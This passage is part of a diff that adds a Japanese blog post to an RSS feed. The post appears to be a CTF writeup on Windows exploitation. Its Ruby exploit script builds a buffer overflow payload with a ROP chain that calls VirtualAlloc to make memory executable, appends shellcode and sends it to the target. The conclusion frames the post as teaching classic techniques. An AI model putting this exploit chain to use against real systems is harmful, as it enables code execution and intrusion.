x50\x00\x00\x00\x2E\x72\x64\x61\x74\x61\x24\x7A\x7A\x7A\x64\x62\x67\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;
+
+payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;C&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;1028&lt;/span&gt;          &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# 1028 byte&lt;/span&gt;
+payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p32(pop_ecx_ret)   &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# Overwrite return address&lt;/span&gt;
+payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p32(&lt;span style=&#34;color:#666&#34;&gt;936&lt;/span&gt;)           &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# ecx &amp;lt;- 936&lt;/span&gt;
+payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p32(jmp_memory)    &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# jmp dword [0x401160+ecx*4] -&amp;gt; 0x402000 (VirtualAlloc)&lt;/span&gt;
+payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p32(stack_addr&lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;44&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# the head address of shellcode&lt;/span&gt;
+payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p32(stack_addr)    &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# lpAddress&lt;/span&gt;
+payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p32(&lt;span style=&#34;color:#666&#34;&gt;1024&lt;/span&gt;)          &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# dwSize = 1024&lt;/span&gt;
+payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p32(&lt;span style=&#34;color:#666&#34;&gt;0x1000&lt;/span&gt;)        &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# flAllocationType = MEM_WRITE&lt;/span&gt;
+payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p32(&lt;span style=&#34;color:#666&#34;&gt;0x40&lt;/span&gt;)          &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# flProtect = PAGE_EXECUTE_READWRITE&lt;/span&gt;
+payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; shellcode
+&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;[*] Send payload&amp;#34;&lt;/span&gt;
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload
+&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;}&amp;#34;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;以下が実行結果である。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/download/U7pR2SU&#34; alt=&#34;x.rbの実行結果&#34; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;4-おわりに&#34;&gt;4. おわりに&lt;/h2&gt;
+
+&lt;p&gt;本記事では、CTFの問題を使ってWindows におけるExploitのための環境構築方法やLinuxとの差について簡単に記した。本問題は、古い問題のためセキュリティ機構などもゆるい。現実の世界でのExploitは、もっと難しいはずだ。しかしながら、本問題のような簡単なBOFを利用したROPなどの古典的なテクニックを理解しておくことで、脅威の度合いについて正しく理解できるだろう。余力があれば、さらに異なるWindows Exploit 問題のWriteupを書いていきたい。&lt;/p&gt;
+</description>
+    </item>
     <item>
       <title>Csaw2019 writeup</title>
       <link>https://owlinux1000.github.io/blog/post/csaw2019/</link>
